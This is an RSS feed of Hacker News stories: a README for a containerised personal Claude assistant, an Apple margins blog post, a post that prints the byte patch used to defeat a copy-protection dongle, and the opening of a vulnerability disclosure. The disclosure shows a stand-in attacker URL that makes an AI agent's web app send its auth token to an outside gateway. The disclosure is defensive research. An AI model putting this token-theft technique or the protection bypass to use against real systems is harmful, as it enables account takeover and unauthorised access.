<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Mon, 02 Feb 2026 00:30:07 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[Show HN: NanoClaw – “Clawdbot” in 500 lines of TS with Apple container isolation (107 pts)]]></title>
            <link>https://github.com/gavrielc/nanoclaw</link>
            <guid>46850205</guid>
            <pubDate>Sun, 01 Feb 2026 22:49:22 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/gavrielc/nanoclaw">https://github.com/gavrielc/nanoclaw</a>, See on <a href="https://news.ycombinator.com/item?id=46850205">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto">
  <a target="_blank" rel="noopener noreferrer" href="https://github.com/gavrielc/nanoclaw/blob/main/assets/nanoclaw-logo.png"><img src="https://github.com/gavrielc/nanoclaw/raw/main/assets/nanoclaw-logo.png" alt="NanoClaw" width="400"></a>
</p>
<p dir="auto">
  My personal Claude assistant that runs securely in Apple containers. Lightweight and built to be understood and customized for your own needs.
</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Why I Built This</h2><a id="user-content-why-i-built-this" aria-label="Permalink: Why I Built This" href="#why-i-built-this"></a></p>
<p dir="auto"><a href="https://github.com/openclaw/openclaw">OpenClaw</a> is an impressive project with a great vision. But I can't sleep well running software I don't understand with access to my life. OpenClaw has 52+ modules, 8 config management files, 45+ dependencies, and abstractions for 15 channel providers. Security is application-level (allowlists, pairing codes) rather than OS isolation. Everything runs in one Node process with shared memory.</p>
<p dir="auto">NanoClaw gives you the same core functionality in a codebase you can understand in 8 minutes. One process. A handful of files. Agents run in actual Linux containers with filesystem isolation, not behind permission checks.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Quick Start</h2><a id="user-content-quick-start" aria-label="Permalink: Quick Start" href="#quick-start"></a></p>
<div dir="auto" data-snippet-clipboard-copy-content="git clone https://github.com/gavrielc/nanoclaw.git
cd nanoclaw
claude"><pre>git clone https://github.com/gavrielc/nanoclaw.git
<span>cd</span> nanoclaw
claude</pre></div>
<p dir="auto">Then run <code>/setup</code>. Claude Code handles everything: dependencies, authentication, container setup, service configuration.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Philosophy</h2><a id="user-content-philosophy" aria-label="Permalink: Philosophy" href="#philosophy"></a></p>
<p dir="auto"><strong>Small enough to understand.</strong> One process, a few source files. No microservices, no message queues, no abstraction layers. Have Claude Code walk you through it.</p>
<p dir="auto"><strong>Secure by isolation.</strong> Agents run in Linux containers (Apple Container). They can only see what's explicitly mounted. Bash access is safe because commands run inside the container, not on your Mac.</p>
<p dir="auto"><strong>Built for one user.</strong> This isn't a framework. It's working software that fits my exact needs. You fork it and have Claude Code make it match your exact needs.</p>
<p dir="auto"><strong>Customization = code changes.</strong> No configuration sprawl. Want different behavior? Modify the code. The codebase is small enough that this is safe.</p>
<p dir="auto"><strong>AI-native.</strong> No installation wizard; Claude Code guides setup. No monitoring dashboard; ask Claude what's happening. No debugging tools; describe the problem, Claude fixes it.</p>
<p dir="auto"><strong>Skills over features.</strong> Contributors shouldn't add features (e.g. support for Telegram) to the codebase. Instead, they contribute skills like <code>/add-telegram</code> that transform your fork. You end up with clean code that does exactly what you need.</p>
<p dir="auto"><strong>Best harness, best model.</strong> This runs on Claude Agent SDK, which means you're running Claude Code directly. The harness matters. A bad harness makes even smart models seem dumb, a good harness gives them superpowers. Claude Code is (IMO) the best harness available.</p>
<p dir="auto"><strong>No ToS gray areas.</strong> Because it uses Claude Agent SDK natively with no hacks or workarounds, using your subscription with your auth token is completely legitimate (I think). No risk of being shut down for terms of service violations (I am not a lawyer).</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">What It Supports</h2><a id="user-content-what-it-supports" aria-label="Permalink: What It Supports" href="#what-it-supports"></a></p>
<ul dir="auto">
<li><strong>WhatsApp I/O</strong> - Message Claude from your phone</li>
<li><strong>Isolated group context</strong> - Each group has its own <code>CLAUDE.md</code> memory, isolated filesystem, and runs in its own container sandbox with only that filesystem mounted</li>
<li><strong>Main channel</strong> - Your private channel (self-chat) for admin control; every other group is completely isolated</li>
<li><strong>Scheduled tasks</strong> - Recurring jobs that run Claude and can message you back</li>
<li><strong>Web access</strong> - Search and fetch content</li>
<li><strong>Container isolation</strong> - Agents sandboxed in Apple containers</li>
<li><strong>Optional integrations</strong> - Add Gmail (<code>/add-gmail</code>) and more via skills</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Usage</h2><a id="user-content-usage" aria-label="Permalink: Usage" href="#usage"></a></p>
<p dir="auto">Talk to your assistant with the trigger word (default: <code>@Andy</code>):</p>
<div data-snippet-clipboard-copy-content="@Andy send an overview of the sales pipeline every weekday morning at 9am (has access to my Obsidian vault folder)
@Andy review the git history for the past week each Friday and update the README if there's drift
@Andy every Monday at 8am, compile news on AI developments from Hacker News and TechCrunch and message me a briefing"><pre><code>@Andy send an overview of the sales pipeline every weekday morning at 9am (has access to my Obsidian vault folder)
@Andy review the git history for the past week each Friday and update the README if there's drift
@Andy every Monday at 8am, compile news on AI developments from Hacker News and TechCrunch and message me a briefing
</code></pre></div>
<p dir="auto">From the main channel (your self-chat), you can manage groups and tasks:</p>
<div data-snippet-clipboard-copy-content="@Andy list all scheduled tasks across groups
@Andy pause the Monday briefing task
@Andy join the Family Chat group"><pre><code>@Andy list all scheduled tasks across groups
@Andy pause the Monday briefing task
@Andy join the Family Chat group
</code></pre></div>
<p dir="auto"><h2 tabindex="-1" dir="auto">Customizing</h2><a id="user-content-customizing" aria-label="Permalink: Customizing" href="#customizing"></a></p>
<p dir="auto">There are no configuration files to learn. Just tell Claude Code what you want:</p>
<ul dir="auto">
<li>"Change the trigger word to @Bob"</li>
<li>"Remember in the future to make responses shorter and more direct"</li>
<li>"Add a custom greeting when I say good morning"</li>
<li>"Store conversation summaries weekly"</li>
</ul>
<p dir="auto">Or run <code>/customize</code> for guided changes.</p>
<p dir="auto">The codebase is small enough that Claude can safely modify it.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Contributing</h2><a id="user-content-contributing" aria-label="Permalink: Contributing" href="#contributing"></a></p>
<p dir="auto"><strong>Don't add features. Add skills.</strong></p>
<p dir="auto">If you want to add Telegram support, don't create a PR that adds Telegram alongside WhatsApp. Instead, contribute a skill file (<code>.claude/skills/add-telegram/SKILL.md</code>) that teaches Claude Code how to transform a NanoClaw installation to use Telegram.</p>
<p dir="auto">Users then run <code>/add-telegram</code> on their fork and get clean code that does exactly what they need, not a bloated system trying to support every use case.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">RFS (Request for Skills)</h3><a id="user-content-rfs-request-for-skills" aria-label="Permalink: RFS (Request for Skills)" href="#rfs-request-for-skills"></a></p>
<p dir="auto">Skills we'd love to see:</p>
<p dir="auto"><strong>Communication Channels</strong></p>
<ul dir="auto">
<li><code>/add-telegram</code> - Add Telegram as channel. Should give the user option to replace WhatsApp or add as additional channel. Also should be possible to add it as a control channel (where it can trigger actions) or just a channel that can be used in actions triggered elsewhere</li>
<li><code>/add-slack</code> - Add Slack</li>
<li><code>/add-discord</code> - Add Discord</li>
</ul>
<p dir="auto"><strong>Container Runtime</strong></p>
<ul dir="auto">
<li><code>/convert-to-docker</code> - Replace Apple Container with Docker (unlocks Linux)</li>
</ul>
<p dir="auto"><strong>Platform Support</strong></p>
<ul dir="auto">
<li><code>/setup-windows</code> - Windows via WSL2 + Docker</li>
</ul>
<p dir="auto"><strong>Session Management</strong></p>
<ul dir="auto">
<li><code>/add-clear</code> - Add a <code>/clear</code> command that compacts the conversation (summarizes context while preserving critical information in the same session). Requires figuring out how to trigger compaction programmatically via the Claude Agent SDK.</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Requirements</h2><a id="user-content-requirements" aria-label="Permalink: Requirements" href="#requirements"></a></p>
<ul dir="auto">
<li>macOS Tahoe (26) or later - runs great on Mac Mini</li>
<li>Node.js 20+</li>
<li><a href="https://claude.ai/download" rel="nofollow">Claude Code</a></li>
<li><a href="https://github.com/apple/container">Apple Container</a></li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Architecture</h2><a id="user-content-architecture" aria-label="Permalink: Architecture" href="#architecture"></a></p>
<div data-snippet-clipboard-copy-content="WhatsApp (baileys) --> SQLite --> Polling loop --> Container (Claude Agent SDK) --> Response"><pre><code>WhatsApp (baileys) --&gt; SQLite --&gt; Polling loop --&gt; Container (Claude Agent SDK) --&gt; Response
</code></pre></div>
<p dir="auto">Single Node.js process. Agents execute in isolated Linux containers with mounted directories. IPC via filesystem. No daemons, no queues, no complexity.</p>
<p dir="auto">Key files:</p>
<ul dir="auto">
<li><code>src/index.ts</code> - Main app: WhatsApp connection, routing, IPC</li>
<li><code>src/container-runner.ts</code> - Spawns agent containers</li>
<li><code>src/task-scheduler.ts</code> - Runs scheduled tasks</li>
<li><code>src/db.ts</code> - SQLite operations</li>
<li><code>groups/*/CLAUDE.md</code> - Per-group memory</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">FAQ</h2><a id="user-content-faq" aria-label="Permalink: FAQ" href="#faq"></a></p>
<p dir="auto"><strong>Why WhatsApp and not Telegram/Signal/etc?</strong></p>
<p dir="auto">Because I use WhatsApp. Fork it and run a skill to change it. That's the whole point.</p>
<p dir="auto"><strong>Why Apple Container instead of Docker?</strong></p>
<p dir="auto">Lightweight, fast, and built into macOS. Requires macOS Tahoe and runs great on a Mac Mini. Contribute a skill to convert to Docker if you want Docker.</p>
<p dir="auto"><strong>Can I run this on Linux?</strong></p>
<p dir="auto">Yes. Run Claude Code and say "make this run on Linux." ~30 min of back-and-forth and it'll work. When you're done, ask Claude to create a skill explaining how to make it work on Linux, then contribute the skill back to the project.</p>
<p dir="auto"><strong>Is this secure?</strong></p>
<p dir="auto">Agents run in containers, not behind application-level permission checks. They can only access explicitly mounted directories. You should still review what you're running, but the codebase is small enough that you actually can. See <a href="https://github.com/gavrielc/nanoclaw/blob/main/docs/SECURITY.md">docs/SECURITY.md</a> for the full security model.</p>
<p dir="auto"><strong>Why no configuration files?</strong></p>
<p dir="auto">We don't want configuration sprawl. Every user should customize it to so that the code matches exactly what they want rather than configuring a generic system. If you like having config files, tell Claude to add them.</p>
<p dir="auto"><strong>How do I debug issues?</strong></p>
<p dir="auto">Ask Claude Code. "Why isn't the scheduler running?" "What's in the recent logs?" "Why did this message not get a response?" That's the AI-native approach.</p>
<p dir="auto"><strong>Why isn't the setup working for me?</strong></p>
<p dir="auto">I don't know. Run <code>claude</code>, then run <code>/debug</code>. If claude finds an issue that is likely affecting other users, open a PR to modify the setup SKILL.md.</p>
<p dir="auto"><strong>What changes will be accepted into the codebase?</strong></p>
<p dir="auto">Security fixes, bug fixes, and clear improvements to the base configuration. That's it.</p>
<p dir="auto">Everything else (new capabilities, OS compatibility, hardware support, enhancements) should be contributed as skills.</p>
<p dir="auto">This keeps the base system minimal and lets every user customize their installation without inheriting features they don't want.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">License</h2><a id="user-content-license" aria-label="Permalink: License" href="#license"></a></p>
<p dir="auto">MIT</p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Margin Call (125 pts)]]></title>
            <link>https://asymco.com/2026/02/01/margin-call-3/</link>
            <guid>46849588</guid>
            <pubDate>Sun, 01 Feb 2026 21:33:02 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://asymco.com/2026/02/01/margin-call-3/">https://asymco.com/2026/02/01/margin-call-3/</a>, See on <a href="https://news.ycombinator.com/item?id=46849588">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
<p>While the commentariat assumes the worst, Apple delivers the best.</p>



<p>Last quarter Apple delivered a gross margin of 48.2%. This was above the high end of their guidance range and up 100 basis points sequentially. Management commented that this was “driven by favorable mix and leverage.”</p>



<p>Further, products gross margin was 40.7%, up 450 basis points sequentially, driven by favorable mix and leverage. Services gross margin was 76.5%, up 120 basis points sequentially, driven by mix.</p>



<p>This performance is even more astonishing considering the history shown below. Apple is quite simply, delivering at the highest gross and net margins in its history. </p>



<figure><a href="https://asymco.com/wp-content/uploads/2026/02/image-5.png"><img fetchpriority="high" decoding="async" width="620" height="539" src="https://asymco.com/wp-content/uploads/2026/02/image-5-620x539.png" alt="Line graph depicting Apple's profit margins over time, including Gross Margin, Operating Margin, Net Margin, Product Margin, and Services Margin percentages, with data spanning from 2010 to 2023." srcset="https://asymco.com/wp-content/uploads/2026/02/image-5-620x539.png 620w, https://asymco.com/wp-content/uploads/2026/02/image-5-440x383.png 440w, https://asymco.com/wp-content/uploads/2026/02/image-5.png 731w" sizes="(max-width: 620px) 100vw, 620px"></a></figure>



<p>Note that the graph actually projects forward one quarter because we have the following guidance: “We expect gross margin to be between 48-49%.” The graph reflects the high end of this guidance range.</p>



<p>So what’s going on?  Especially as a drumbeat of constant doom is being broadcast by pundits. The conference call itself seemed to be dedicated to margins. It became what I call the Margin Call. </p>



<p>Amit Daryanani, the first questioning analyst, specifically kicked off with the following:</p>



<blockquote>
<p>“there is a lot of focus on the impact of memory to host the companies, and I would love to kind of get your perspective when you are first guiding gross margins up into March. Talk about, a, your comfort in securing the bit that you need for shipment and b, how do we think about memory inflation flowing through Apple’s model over time?”</p>
</blockquote>



<p>Tim Cook answered: </p>



<blockquote>
<p>We are currently constrained, and at this point, it is difficult to predict when supply and demand will balance. The constraints that we have are driven by the availability of the advanced nodes that our SoCs are produced on. And at this time, we are seeing less flexibility in the supply chain than normal, partly because of our increased demand that I just spoke about. From a memory point of view, to answer your question, <strong>memory had a minimal impact on Q1. So the December gross margin. We do expect it to be a bit more of an impact on the Q2 gross margin, and that was comprehended in the outlook of 48 to 49% that Kevin gave earlier</strong>.</p>
</blockquote>



<p>what Apple is saying is that they are constrained by production of silicon but not of memory. They do see some impact in the future but that is included in a guidance of <strong>margin expansion</strong>. </p>



<p>Analysts still could not believe this, the following exchange soon followed:</p>



<blockquote>
<p><strong>Ben Reitzes</strong>: So the next question is on gross margin. I am pretty shocked I gotta hand it to you, Tim. I am, you know, that you are able to do 48 to 49. What is really going on there? How are you doing that with this memory, the NAND prices? Is it due to mix that there is a good less hardware and more services? Services and services margins are going up. How are you doing it to keep it at 48 to 49?</p>



<p><strong>Kevan Parekh</strong>: Yeah, Ben. This is Kevin. [] Let me start maybe by just reflecting on the Q1 gross margin. I think we talked about the fact that we landed at 48.2%, so just above the high end of the range we provided, [], on the last call. [] if you look at that performance, [], we were up 100 basis points sequentially. We talked about the fact that we had favorable mix. [], as you know, when we have a good product cycle, strong price cycle we are seeing for iPhone, that does lend itself to a bit more favorable opportunity on the [] leverage side.</p>



<p>So we are having a strong iPhone cycle as Tim outlined. And so that also translates itself. So we talked about products sequentially went up by 450 basis points. So I think, in general, I think we are just seeing, [], favorable mix dynamics as well. [], service continues to contribute as well. That business is growing, [], double digits, so that also is a contributor. And I think that, [], if you looked at our guidance, [], we are providing a similar range to where we reported in December. There are going to be a few puts and takes. [], we do expect to see favorable mix in the services.</p>



<p>As you know, when we move from Q1 to Q2, that tends to be the case, and that is partly offset by a seasonal loss leverage. So there will be puts and takes, but again, we feel pretty good about the guide of 48 to 49%, which is similar to the range we reported in December.</p>
</blockquote>



<p>Still not enough. Two more questions followed on margin. I will quote one here.  </p>



<blockquote>
<p><strong>Aaron Rakers</strong>: Yep. And then as a quick follow-up, you know, kind of tied to memory, maybe not so much, but part of this current generation iPhone cycle is you clearly deepened some of your own internal silicon capabilities on the device. I am curious if that if we should think about that as a lever and maybe a supportive factor to gross margin that might be underappreciated and any thoughts on where we go from here as far as continual opportunities of internalizing your own silicon? Thank you.</p>



<p><strong>Timothy D. Cook</strong>: Yeah. I will let Kevin talk about the gross margin. But in terms of the product, which is at the heart of what we think about in the user, Apple silicon has just been an incredible game changer for us. Starting with iPhone and then on iPad and, of course, the Mac as of a few years ago. And so we believe it is a game changer and a major advantage.</p>



<p><strong>Kevan Parekh</strong>: Yeah. And as far as impact on gross margin, yeah, we have been, as you know, investing in core technologies like our own silicon and our own modem. And certainly, while those do provide opportunities for cost savings and can be plugged in margins, they also importantly provide, [], the differentiation that is really important for our products as well and us more control of our roadmap. So I think there is a lot of strategic value to it, but also we are seeing, [], investments in our core technologies impacting, [], gross margin in a positive way.</p>
</blockquote>



<p>After all this, the financial commentariat continues to assume that Apple will be hit with margin pressure from memory and that has presumably been affecting the share price since the call.</p>



<p>Well, we’ve seen all this before. Before the great memory crisis Apple was going to be constrained by tariffs, by China, by developer dissatisfaction, by AI, by regulators, etc.</p>



<p>The feeling one gets is that Apple is always navigating through a minefield of pitfalls and gotchas. The opposite is true. It’s highly likely that Apple has sufficient leverage which increases its access to supply and that everyone is keen to work with the company. Leverage comes from scale, from lead time, from vertical integration and from engineering. Management is saying as much. Indeed, the evidence of leverage across the supply chain and over the entire ecosystem and economy is evident in its margin expansion story told in the graph above. </p>




</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Defeating a 40-year-old copy protection dongle (170 pts)]]></title>
            <link>https://dmitrybrant.com/2026/02/01/defeating-a-40-year-old-copy-protection-dongle</link>
            <guid>46849567</guid>
            <pubDate>Sun, 01 Feb 2026 21:30:51 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://dmitrybrant.com/2026/02/01/defeating-a-40-year-old-copy-protection-dongle">https://dmitrybrant.com/2026/02/01/defeating-a-40-year-old-copy-protection-dongle</a>, See on <a href="https://news.ycombinator.com/item?id=46849567">Hacker News</a></p>
<div id="readability-page-1" class="page"><article id="post-2557">
	
	<!-- .entry-header -->

	<div>
		<p><img decoding="async" src="https://dmitrybrant.com/images/20260105204922.jpg" alt="image"></p>
<p>That’s right — this little device is what stood between me and the ability to run an <em>even older</em> piece of software that I recently unearthed during an expedition of software archaeology.</p>
<p>For a bit more background, I was recently involved in helping a friend’s accounting firm to move away from using an <em>extremely</em> legacy software package that they had locked themselves into using for the last four decades.</p>
<p>This software was built using a programming language called <a href="https://en.wikipedia.org/wiki/IBM_RPG">RPG</a> (“Report Program Generator”), which is older than COBOL (!), and was used with IBM’s midrange computers such as the System/3, System/32, and all the way up to the AS/400. Apparently, RPG was subsequently ported to MS-DOS, so that the same software tools built with RPG could run on personal computers, which is how we ended up here.</p>
<p>This accounting firm was actually using a Windows 98 computer (yep, in 2026), and running the RPG software inside a DOS console window. And it turned out that, in order to run this software, it requires a special hardware copy-protection dongle to be attached to the computer’s parallel port! This was a relatively common practice in those days, particularly with “enterprise” software vendors who wanted to protect their very important™ software from unauthorized use.</p>
<p><img decoding="async" src="https://dmitrybrant.com/images/20260105204921.jpg" alt="image"></p>
<p>Sadly, most of the text and markings on the dongle’s label has been worn or scratched off, but we can make out several clues:</p>
<ul>
<li>The words “Stamford, CT”, and what’s very likely the logo of a company called “Software Security Inc”. The only evidence for the existence of this company is this record of them exhibiting their wares at <a href="https://history.siggraph.org/exhibitor/software-security-inc/">SIGGRAPH conferences</a> in the early 1990s, as well as several <a href="https://patentimages.storage.googleapis.com/e6/69/0e/9f00041c0a3840/US5337357.pdf">patents</a> issued to them, relating to software protection.</li>
<li>A word that seems to say “RUNTIME”, which will become clear in a bit.</li>
</ul>
<p>My first course of action was to take a disk image of the Windows 98 PC that was running this software, and get it running in an emulator, so that we could see what the software actually does, and perhaps export the data from this software into a more modern format, to be used with modern accounting tools. But of course all of this requires the hardware dongle; none of the accounting tools seem to work without it plugged in.</p>
<p>Before doing anything, I looked through the disk image for any additional interesting clues, and found plenty of fascinating (and archaeologically significant?) stuff:</p>
<p><img decoding="async" src="https://dmitrybrant.com/images/w98rpg.png" alt="image"></p>
<ul>
<li>We’ve got a compiler for the RPG II language (excellent!), made by a company called Software West Inc.</li>
<li>Even better, there are <em>two versions</em> of the RPG II compiler, released on various dates in the 1990s by Software West.</li>
<li>We’ve got the complete source code of the accounting software, written in RPG. It looks like the full accounting package consists of numerous RPG modules, with a gnarly combination of DOS batch files for orchestrating them, all set up as a “menu” system for the user to navigate using number combinations. Clearly the author of this accounting system was originally an IBM mainframe programmer, and insisted on bringing those skills over to DOS, with mixed results.</li>
</ul>
<p>I began by playing around with the RPG compiler in isolation, and I learned very quickly that it’s the RPG compiler itself that requires the hardware dongle, and then the compiler automatically injects the same copy-protection logic into any executables it generates. This explains the text that seems to say “RUNTIME” on the dongle.</p>
<p>The compiler consists of a few executable files, notably <code>RPGC.EXE</code>, which is the compiler, and <code>SEU.EXE</code>, which is a source editor (“Source Entry Utility”). Here’s what we get when we launch SEU without the dongle, after a couple of seconds:</p>
<p><img decoding="async" src="https://dmitrybrant.com/images/seu1.png" alt="image"></p>
<p>A bit rude, but this gives us an important clue: this program must be trying to communicate over the parallel port over the course of a few seconds (which could give us an opportunity to pause it for debugging, and see what it’s doing during that time), and then exits with a message (which we can now find in a disassembly of the program, and trace how it gets there).</p>
<p>A great tool for disassembling executables of this vintage is <a href="https://github.com/uxmal/reko">Reko</a>. It understands 16-bit real mode executables, and even attempts to decompile them into readable C code that corresponds to the disassembly.</p>
<p><img decoding="async" src="https://dmitrybrant.com/images/rekorpg3.png" alt="image"></p>
<p>And so, looking at the decompiled/disassembled code in Reko, I expected to find <code>in</code> and <code>out</code> instructions, which would be the telltale sign of the program trying to communicate with the parallel port through the PC’s I/O ports. However… I didn’t see an <code>in</code> or <code>out</code> instruction anywhere! But then I noticed something: Reko disassembled the executable into two “segments”: <code>0800</code> and <code>0809</code>, and I was only looking at segment <code>0809</code>.</p>
<p><img decoding="async" src="https://dmitrybrant.com/images/rekorpg2.png" alt="image"></p>
<p>If we look at segment <code>0800</code>, we see the smoking gun: <code>in</code> and <code>out</code> instructions, meaning that the copy-protection routine is definitely here, and best of all, the entire code segment is a mere 0x90 bytes, which suggests that the entire routine should be pretty easy to unravel and understand. For some reason, Reko was not able to decompile this code into a C representation, but it still produced a disassembly, which will work just fine for our purposes. Maybe this was a primitive form of obfuscation from those early days, which is now confusing Reko and preventing it from associating this chunk of code with the rest of the program… who knows.</p>
<p>Here is a GitHub Gist with the <a href="https://gist.github.com/dbrant/1d1a9ba2a2a41d5ba7be50ccb3d36d6c">disassembly of this code</a>, along with my annotations and notes. My x86 assembly knowledge is a little rusty, but here is the gist of what this code does:</p>
<ul>
<li>It’s definitely a single self-contained routine, intended to be called using a “far” <code>CALL</code> instruction, since it returns with a <code>RETF</code> instruction.</li>
<li>It begins by detecting the address of the parallel port, by reading the <a href="https://wiki.osdev.org/Memory_Map_(x86)#BIOS_Data_Area_(BDA)">BIOS data area</a>. If the computer has more than one parallel port, the dongle must be connected to the <em>first</em> parallel port (LPT1).</li>
<li>It performs a loop where it writes values to the data register of the parallel port, and then reads the status register, and accumulates responses in the <code>BH</code> and <code>BL</code> registers.</li>
<li>At the end of the routine, the “result” of the whole procedure is stored in the <code>BX</code> register (<code>BH</code> and <code>BL</code> together), which will presumably be “verified” by the caller of the routine.</li>
<li>Very importantly, there doesn’t seem to be any “input” into this routine. It doesn’t pop anything from the stack, nor does it care about any register values passed into it. Which can only mean that the result of this routine is <em>completely constant</em>! No matter what complicated back-and-forth it does with the dongle, the result of this routine should always be the same.</li>
</ul>
<p>With the knowledge that this routine must exit with some magic value stored in <code>BX</code>, we can now patch the first few bytes of the routine to do just that! Not yet knowing which value to put in <code>BX</code>, let’s start with 1234:</p>
<pre><code>BB 34 12       MOV BX, 1234h
CB             RETF
</code></pre>
<p>Only the first four bytes need patching — set <code>BX</code> to our desired value, and get out of there. Running the patched executable with these new bytes still fails (expectedly) with the same message of “No dongle, no edit”, but it fails immediately, instead of after several seconds of talking to the parallel port. Progress!</p>
<p>Stepping through the disassembly more closely, we get another major clue: The only value that <code>BH</code> can be at the end of the routine is 76h. So, our total value for the magic number in <code>BX</code> must be of the form 76xx. In other words, only the <code>BL</code> value remains unknown:</p>
<pre><code>BB __ 76       MOV BX, 76__h
CB             RETF
</code></pre>
<p>Since <code>BL</code> is an 8-bit register, it can only have 256 possible values. And what do we do when we have 256 combinations to try? Brute force it! I whipped up a script that plugs a value into that particular byte (from 0 to 255) and programmatically launches the executable in DosBox, and observes the output. Lo and behold, it worked! The brute forcing didn’t take long at all, because the correct number turned out to be… <em>6</em>. Meaning that the total magic number in <code>BX</code> should be 7606h:</p>
<pre><code>BB 06 76       MOV BX, 7606h
CB             RETF
</code></pre>
<p><img decoding="async" src="https://dmitrybrant.com/images/seu2.png" alt="image"></p>
<p>Bingo!<br>
And then, proceeding to examine the other executable files in the compiler suite, the parallel port routine turns out to be <em>exactly the same</em>. All of the executables have the exact same copy protection logic, as if it was rubber-stamped onto them. In fact, when the compiler (<code>RPGC.EXE</code>) compiles some RPG source code, it seems to copy the parallel port routine from itself into the compiled program. That’s right: the patched version of the compiler will produce executables with the same patched copy protection routine! Very convenient.</p>
<p>I must say, this copy protection mechanism seems a bit… simplistic? A hardware dongle that just passes back a constant number? Defeatable with a four-byte patch? Is this really worthy of a patent? But who am I to pass judgment. It’s possible that I haven’t fully understood the logic, and the copy protection will somehow re-surface in another way. It’s also possible that the creators of the RPG compiler (Software West, Inc) didn’t take proper advantage of the hardware dongle, and used it in a way that is so easily bypassed.</p>
<p>In any case, Software West’s RPG II compiler is now free from the constraint of the parallel port dongle! And at some point soon, I’ll work on purging any PII from the compiler directories, and make this compiler available as an artifact of computing history. It doesn’t seem to be available anywhere else on the web. If anyone reading this was associated with Software West Inc, feel free to get in touch — I have many questions!</p>
	</div><!-- .entry-content -->

	
	<!-- .entry-footer -->

</article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[1-Click RCE to steal your Moltbot data and keys (142 pts)]]></title>
            <link>https://depthfirst.com/post/1-click-rce-to-steal-your-moltbot-data-and-keys</link>
            <guid>46848769</guid>
            <pubDate>Sun, 01 Feb 2026 19:47:47 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://depthfirst.com/post/1-click-rce-to-steal-your-moltbot-data-and-keys">https://depthfirst.com/post/1-click-rce-to-steal-your-moltbot-data-and-keys</a>, See on <a href="https://news.ycombinator.com/item?id=46848769">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><h2>Hacking the Hottest Agent in Tech</h2><p>OpenClaw (formerly Moltbot and ClawdBot), the open-source AI personal assistant that can take actions on your behalf, is the most popular topic on X right now. It is already trusted by over 100,000 developers to hold the keys to their digital life, from iMessage/WhatsApp/Slack access to unrestricted local computer control. But when you grant an agent "god mode" permissions, the margin for error vanishes. While the community celebrated its capabilities, depthfirst General Security Intelligence silently audited its code and found a critical vulnerability. I investigated the finding, combined it with a vulnerability I discovered, and chained them into a 1-Click Remote Code Execution (RCE) exploit. With this exploit, a single visit to a malicious webpage was enough to hack your computer and AI assistant.</p><p>I’ll dissect the logic flaw depthfirst uncovered and walk you through the exact kill chain I built to weaponize it.</p><h2>How depthfirst Flagged the Vulnerability</h2><p>Codebases are rarely linear; logic is scattered, fragmented, and buried across dozens of files. That’s where the complexity and bugs hide.</p><p>Our system maps the full flow of an application's lifecycle. Here, our engine stitched together a data flow across the stack to reveal a critical logic gap: </p><p><strong>1. Ingestion:</strong> <code>app-settings.ts</code> blindly accepts a <code>gatewayUrl</code> query parameter in the URL and persists it to storage. For example, <code>https://localhost?gatewayUrl=attacker.com</code> would save <code>attacker.com</code> as the new gateway url.</p><pre contenteditable="false"><code><span>const</span><span> gatewayUrlRaw = params.get(</span><span>"gatewayUrl"</span><span>);
</span>...
<span></span><span>if</span><span> (gatewayUrlRaw != </span><span>null</span><span>) {
</span><span>  </span><span>const</span><span> gatewayUrl = gatewayUrlRaw.trim();
</span><span>  </span><span>if</span><span> (gatewayUrl &amp;&amp; gatewayUrl !== host.settings.gatewayUrl) {
</span><span>    applySettings(host, { ...host.settings, gatewayUrl }); </span><span>// persisted via saveSettings -&gt; localStorage</span><span>
</span>  }
<!-- -->}
</code></pre><p><strong>2. Processing:</strong> <code>app-lifecycle.ts</code> triggers <code>connectGateway()</code> <em>immediately</em> after settings (such as the gateway url) are applied.</p><pre contenteditable="false"><code><span>handleConnected</span><span>(</span><span>host</span><span>)</span><span> {
</span>  ...
<span>  connectGateway(host); </span><span>// runs immediately on load after parsing URL params</span><span>
</span>  startNodesPolling(host);
<!-- -->  ...
<!-- -->}</code></pre><p>3. <strong>Protocol Execution:</strong> gateway.ts automatically bundles the security-sensitive authToken into the system’s connection handshake to the new gateway.</p><pre contenteditable="false"><code><span>const</span><span> params = { ... , authToken, </span><span>locale</span><span>: navigator.language };
